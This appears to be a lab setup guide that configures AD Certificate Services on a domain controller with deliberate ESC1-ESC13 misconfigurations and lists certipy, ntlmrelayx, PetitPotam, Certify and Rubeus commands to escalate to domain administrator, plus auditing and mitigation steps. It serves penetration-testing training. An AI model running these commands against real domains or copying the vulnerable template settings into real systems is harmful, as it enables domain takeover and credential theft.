@@ -1,0 +1,486 @@
+## Implementing ESC1-ESC15 Vulnerabilities
+
+---
+
+## Overview
+
+This guide will help you install and configure ADCS on DC01 with intentional vulnerabilities (ESC1-ESC15) for CRTP/CRTE practice.
+
+### What are ESC Vulnerabilities?
+
+ESC (Escalation) vulnerabilities in ADCS are misconfigurations that allow privilege escalation and persistence in Active Directory environments. These were documented by Will Schroeder and Lee Christensen.
+
+---
+
+## Installation Steps
+
+### Step 1: Install ADCS on DC01 (30 minutes)
+
+1. **Login to DC01** as **REDTEAM\Administrator**
+2. **Open PowerShell ISE** as Administrator
+3. **Copy Part 1** of the ADCS script from artifacts
+4. **Run the script** to install ADCS roles
+5. **Restart DC01** when prompted
+
+```powershell
+# Install ADCS Role
+Install-WindowsFeature -Name AD-Certificate, ADCS-Cert-Authority, ADCS-Web-Enrollment -IncludeManagementTools
+Restart-Computer -Force
+```
+
+### Step 2: Configure Certificate Authority (After Restart)
+
+1. **Login to DC01** after restart
+2. **Open PowerShell ISE** as Administrator
+3. **Copy Part 2** of the ADCS script
+4. **Run to configure** the Enterprise Root CA
+
+```powershell
+# Configure CA
+Install-AdcsCertificationAuthority -CAType EnterpriseRootCA `
+    -CryptoProviderName "RSA#Microsoft Software Key Storage Provider" `
+    -KeyLength 2048 `
+    -HashAlgorithmName SHA256 `
+    -ValidityPeriod Years `
+    -ValidityPeriodUnits 10 `
+    -CACommonName "REDTEAM-CA" `
+    -Force
+
+# Configure Web Enrollment
+Install-AdcsWebEnrollment -Force
+```
+
+### Step 3: Create Vulnerable Templates
+
+1. **Still in PowerShell ISE** on DC01
+2. **Copy Part 3** of the ADCS script (the main vulnerability configuration)
+3. **Run the entire script** - this will create all ESC templates
+
+This process takes about 5-10 minutes to complete.
+
+---
+
+## ESC Vulnerabilities Explained
+
+### ESC1 - Misconfigured Certificate Templates
+
+**Vulnerability**: Template allows requesters to specify Subject Alternative Name (SAN)
+
+**Configuration**:
+
+- `msPKI-Certificate-Name-Flag = 1` (ENROLLEE_SUPPLIES_SUBJECT)
+- Client Authentication EKU
+- Domain Users can enroll
+
+**Exploitation**:
+
+```bash
+# From Kali
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC1-Template' -upn administrator@redteam.lab
+```
+
+### ESC2 - Any Purpose EKU
+
+**Vulnerability**: Certificate can be used for any purpose
+
+**Configuration**:
+
+- EKU = `2.5.29.37.0` (Any Purpose)
+- Allows authentication as any user
+
+**Exploitation**:
+
+```bash
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC2-Template'
+```
+
+### ESC3 - Certificate Request Agent
+
+**Vulnerability**: Certificate can be used to request certificates on behalf of other users
+
+**Configuration**:
+
+- EKU = Certificate Request Agent
+- Enrollment agent restriction not configured
+
+**Exploitation**:
+
+```bash
+# Request agent certificate
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC3-Template'
+
+# Use agent cert to request on behalf of administrator
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'User' -on-behalf-of 'redteam\administrator' -pfx agent.pfx
+```
+
+### ESC4 - Vulnerable Access Control
+
+**Vulnerability**: Low-privileged users have write access to certificate templates
+
+**Configuration**:
+
+- Domain Users have WriteDacl permission
+- Allows modification of template to make it vulnerable
+
+**Exploitation**:
+
+```bash
+# Modify template to add ESC1 vulnerability
+certipy template -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -template 'ESC4-Template' -save-old
+```
+
+### ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2
+
+**Vulnerability**: CA flag allows SAN to be specified in any certificate request
+
+**Configuration**:
+
+- `EDITF_ATTRIBUTESUBJECTALTNAME2` flag enabled on CA
+- Affects ALL templates
+
+**Exploitation**:
+
+```bash
+# Request any template with custom SAN
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'User' -upn administrator@redteam.lab
+```
+
+### ESC7 - Vulnerable CA Permissions
+
+**Vulnerability**: Low-privileged users can manage CA or approve pending requests
+
+**Configuration**:
+
+- Domain Users have ManageCA or ManageCertificates rights
+
+**Exploitation**:
+
+```bash
+# Add ESC6 flag to CA
+certipy ca -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -add-policy 'SubCA'
+```
+
+### ESC8 - NTLM Relay to HTTP Endpoints
+
+**Vulnerability**: Web enrollment accepts NTLM authentication
+
+**Configuration**:
+
+- Web enrollment enabled at `/certsrv`
+- NTLM authentication enabled
+- Extended Protection not configured
+
+**Exploitation**:
+
+```bash
+# From Kali - relay NTLM auth to certsrv
+ntlmrelayx.py -t http://dc01.redteam.lab/certsrv/certfnsh.asp -smb2support --adcs --template 'User'
+```
+
+### ESC9 - No Security Extension
+
+**Vulnerability**: Template has CT_FLAG_NO_SECURITY_EXTENSION set
+
+**Configuration**:
+
+- Allows certificates without security extension
+- Can be used with unpatched authentication
+
+**Exploitation**:
+
+```bash
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC9-Template' -upn administrator@redteam.lab
+```
+
+### ESC10 - Weak Certificate Mappings
+
+**Vulnerability**: Certificate mapping allows authentication without strong binding
+
+**Configuration**:
+
+- `StrongCertificateBindingEnforcement = 0` in registry
+- Weak mapping methods enabled
+
+**Exploitation**:
+
+```bash
+# Authenticate with modified certificate
+certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10
+```
+
+### ESC11 - ICPR NTLM Relay
+
+**Vulnerability**: RPC interface (ICPR) vulnerable to NTLM relay
+
+**Configuration**:
+
+- RPC interface accepts NTLM
+- Can be triggered via PetitPotam or Coercer
+
+**Exploitation**:
+
+```bash
+# Coerce authentication and relay to ICPR
+certipy relay -ca 'REDTEAM-CA' -template 'User'
+```
+
+### ESC13 - Policy OID Group Link
+
+**Vulnerability**: Issuance policy OID linked to groups
+
+**Configuration**:
+
+- Certificate Application Policy OID
+- Linked to privileged group
+
+**Exploitation**:
+
+```bash
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC13-Template'
+```
+
+---
+
+## Verification
+
+### Verify ADCS Installation
+
+```powershell
+# On DC01
+certutil -TCAInfo
+certutil -Template
+
+# List all templates
+Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)" -Filter * | Select Name, DisplayName
+```
+
+### Test Web Enrollment
+
+1. Open browser on any domain-joined machine
+2. Navigate to: `http://dc01.redteam.lab/certsrv`
+3. Login with domain credentials
+4. You should see the certificate enrollment page
+
+### Scan with Certipy (From Kali)
+
+```bash
+# Install Certipy
+pip3 install certipy-ad
+
+# Scan for vulnerable templates
+certipy find -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -vulnerable -stdout
+
+# Save to file
+certipy find -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -vulnerable -json -output certipy_output
+```
+
+Expected output should show:
+
+- ESC1-Template (ESC1)
+- ESC2-Template (ESC2)
+- ESC3-Template (ESC3)
+- ESC4-Template (ESC4)
+- ESC6 flag on CA
+- ESC7 permissions
+- ESC8 web enrollment
+- ESC9-Template (ESC9)
+- ESC10 weak mappings
+- ESC11 ICPR interface
+- ESC13-Template (ESC13)
+
+---
+
+## Exploitation Practice Order
+
+### Beginner Level
+
+1. **ESC1** - Request cert with arbitrary SAN
+2. **ESC2** - Request Any Purpose cert
+3. **ESC8** - NTLM relay to web enrollment
+
+### Intermediate Level
+
+4. **ESC3** - Use enrollment agent
+5. **ESC4** - Modify template ACLs
+6. **ESC6** - Abuse CA flag
+7. **ESC9** - No security extension
+
+### Advanced Level
+
+8. **ESC7** - Manage CA permissions
+9. **ESC10** - Weak certificate mappings
+10. **ESC11** - ICPR relay with PetitPotam
+11. **ESC13** - OID group linking
+
+---
+
+## Useful Certipy Commands
+
+### Finding Vulnerabilities
+
+```bash
+# Enumerate all ADCS
+certipy find -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10
+
+# Find vulnerable templates only
+certipy find -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -vulnerable
+
+# Output to BloodHound format
+certipy find -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -bloodhound
+```
+
+### Requesting Certificates
+
+```bash
+# Request with SAN (ESC1)
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC1-Template' -upn administrator@redteam.lab
+
+# Request as enrollment agent (ESC3)
+certipy req -u jsmith@redteam.lab -p 'Summer2024!' -dc-ip 192.168.100.10 -ca 'REDTEAM-CA' -template 'ESC3-Template'
+```
+
+### Authentication with Certificate
+
+```bash
+# Authenticate and get TGT
+certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10
+
+# Get NT hash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.100.10 -ldap-shell
+```
+
+### Certificate Relay
+
+```bash
+# Setup relay to ICPR
+certipy relay -ca 'REDTEAM-CA' -template 'User'
+
+# In another terminal, trigger auth with PetitPotam
+python3 PetitPotam.py -d redteam.lab -u jsmith -p 'Summer2024!' <attacker_ip> dc01.redteam.lab
+```
+
+---
+
+## Additional Tools
+
+### Certify (Windows)
+
+```powershell
+# From Windows machine
+.\Certify.exe find /vulnerable
+
+# Request certificate
+.\Certify.exe request /ca:DC01\REDTEAM-CA /template:ESC1-Template /altname:administrator
+
+# Convert PFX
+.\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:password /ptt
+```
+
+### PSPKIAudit
+
+```powershell
+# Audit ADCS configuration
+Import-Module PSPKIAudit
+Invoke-PKIAudit -CAName "REDTEAM-CA"
+```
+
+---
+
+## Troubleshooting
+
+### Web Enrollment Not Accessible
+
+```powershell
+# Restart IIS
+iisreset
+
+# Check if web enrollment is installed
+Get-WindowsFeature ADCS-Web-Enrollment
+
+# Verify IIS is running
+Get-Service W3SVC
+```
+
+### Template Not Showing Up
+
+```powershell
+# Republish templates
+certutil -SetCATemplates +ESC1-Template
+
+# Restart Certificate Services
+Restart-Service CertSvc
+```
+
+### Certificate Request Fails
+
+```powershell
+# Check CA status
+certutil -ping
+
+# View CA configuration
+certutil -CAInfo
+
+# Check template permissions
+certutil -v -template ESC1-Template
+```
+
+---
+
+## Detection and Blue Team
+
+### Enable Auditing
+
+```powershell
+# Enable certificate services auditing
+auditpol /set /subcategory:"Certification Services" /success:enable /failure:enable
+
+# Enable object access auditing
+auditpol /set /subcategory:"Directory Service Access" /success:enable
+```
+
+### Monitor for Exploitation
+
+Watch for:
+
+- Event ID 4886/4887 - Certificate request
+- Event ID 4888/4889 - Certificate approval
+- Unusual SAN values in certificates
+- Multiple certificate requests from single user
+- Certificate requests with high-privilege UPNs
+
+### Mitigation
+
+```powershell
+# Remove vulnerable flags
+certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
+
+# Enable strong certificate binding
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\Kdc" -Name "StrongCertificateBindingEnforcement" -Value 2
+
+# Remove vulnerable templates
+certutil -SetCATemplates -ESC1-Template
+```
+
+---
+
+## References
+
+- **Certified Pre-Owned**: https://posts.specterops.io/certified-pre-owned-d95910965cd2
+- **Certipy Documentation**: https://github.com/ly4k/Certipy
+- **ADCS Attacks**: https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation
+- **ESC13 Research**: https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53
+
+---
+
+## Next Steps
+
+After ADCS is configured:
+
+1. ✅ **Take snapshot** of DC01 with ADCS configured
+2. ✅ **Scan with Certipy** from Kali to verify all vulnerabilities
+3. ✅ **Practice exploitation** in order of difficulty
+4. ✅ **Document attack paths** found
+5. ✅ **Test detection** mechanisms
+
+Your lab now has comprehensive ADCS vulnerabilities for CRTP/CRTE practice! 🎓
+
